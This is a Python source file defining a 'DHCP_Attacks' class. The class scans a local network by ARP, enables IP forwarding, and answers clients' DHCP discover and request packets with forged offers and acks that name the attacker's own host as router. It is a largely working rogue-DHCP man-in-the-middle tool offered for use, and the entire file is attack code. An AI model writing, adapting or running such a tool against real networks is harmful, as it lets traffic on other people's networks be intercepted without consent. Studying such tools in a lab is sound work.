import random
import subprocess
from datetime import datetime,timedelta 
from pysnmp.hlapi import *
import scapy.all as scapy
from scapy.layers import dhcp,l2
from threading import Thread
import ipcalc


class DHCP_Attacks:
    def __init__(self,interface,network):
        self.interface = interface
        self.network = network
        ################
        
        
        self.ip_to_give = ""
        self.myip = ""
        self.mymac = ""
        self.used_IPs = []
        self.avaliable_IPs = []
        self.mac_address_snooped = []
        self.current_time = datetime.now()
        
        #########################

        
    def _sniff_dhcp(self,packet):  
        if self.ip_to_give == "":
            self.ip_to_give = self._assign_random_IP()  
        #Device MAC and IP list Tuple as (IP,MAC)
        #print(device_list)
        if (packet.haslayer(dhcp.DHCP)):
            if "DHCP Discover" in str(packet):
                print("Got a discover packet")
                mac_address_for_dhcp = packet[l2.Ether].src    
                
                packet = dhcp.Ether(src=self.mymac,dst=mac_address_for_dhcp)/ dhcp.IP(src=self.myip,dst=self.ip_to_give)/dhcp.UDP(sport=67,dport=68)/ dhcp.BOOTP(
                    op=2,
                    yiaddr=self.ip_to_give,
                    siaddr=self.myip,
                    giaddr=self.myip,
                    chaddr=mac_address_for_dhcp,
                    xid=packet[dhcp.BOOTP].xid
                    ) / dhcp.DHCP(options=[("message-type",'offer'),('subnet_mask',ipcalc.Network(self.network).netmask()),('router',self.myip),('end')])
                scapy.sendp(packet,iface=self.interface)  

        if (packet.haslayer(dhcp.DHCP)):
            if "DHCP Request" in str(packet):
                print("Got a DHCP Request")
                mac_address_for_dhcp = packet[l2.Ether].src 
                if mac_address_for_dhcp not in self.mac_address_snooped:   
                    packet = dhcp.Ether(src=self.mymac,dst=mac_address_for_dhcp)/ dhcp.IP(src=self.myip,dst=self.ip_to_give)/dhcp.UDP(sport=67,dport=68)/ dhcp.BOOTP(
                        op=2,
                        yiaddr=self.ip_to_give,
                        siaddr=self.myip,
                        giaddr=self.myip,
                        chaddr=mac_address_for_dhcp,
                        xid=packet[dhcp.BOOTP].xid,
                        ) / dhcp.DHCP(options=[("message-type",'ack'),('subnet_mask',ipcalc.Network(self.network).netmask()),('router',self.myip),('end')])
                    scapy.sendp(packet,iface=self.interface)
                    self.ip_to_give =  ""
                    self.mac_address_snooped.append(mac_address_for_dhcp)
                    
        if (self.current_time > datetime.now() + timedelta(seconds=30)):
            self.mac_address_snooped = []
            self.current_time = datetime.now()
                
    def _assign_random_IP(self):
        
        for i in ipcalc.Network(self.network):
            if not i in self.used_IPs:
                self.avaliable_IPs.append(i)
        chosen_ip = str(self.avaliable_IPs[random.randint(0,len(self.avaliable_IPs)-1)])
        self.used_IPs.append(chosen_ip)
        self.avaliable_IPs.remove(chosen_ip)
        return chosen_ip
        
    def _scan_network(self):
            device_list = []
            try:
                subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward')
            except:
                    print("Please enable IP routing if using Windows or Mac!")
                # Create arp packet object. pdst - destination host ip address
            arp_request = scapy.ARP(pdst=self.network)
                    # Create ether packet object. dst - broadcast mac address. 
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                    # Combine two packets in two one
            arp_request_broadcast = broadcast/arp_request
                    # Get list with answered hosts
            answered_list,unanswered_list = scapy.srp(arp_request_broadcast,timeout=3,
                                            iface=self.interface)
            for i in range(1,len(answered_list)+1):
                if (answered_list[i-1][0].pdst == answered_list[i-1][0].psrc):
                    my_ip = answered_list[i-1][0].pdst
                device_list.append((answered_list[i-1][0].pdst,answered_list[i-1][1].hwsrc))
            for device_tuple in device_list:
                if device_tuple[0] == my_ip:
                        self.myip = my_ip
                        self.mymac = device_tuple[1]
                        device_list.pop(device_list.index(device_tuple))      
            return device_list            
                        
        ###########################################
        ###########################################
        ###########################################
        ###########################################
        ###########################################
        ###########################################
        ###########################################
        
    def dhcp_snoop(self):
        devices = self._scan_network()
        for i in devices: #(IP,MAC) tuple
            IP = i[0]
            self.used_IPs.append(IP)
        self.ip_to_give =self._assign_random_IP()
        
        scapy.sniff(iface=self.interface,store=False,prn=self._sniff_dhcp)

        
        
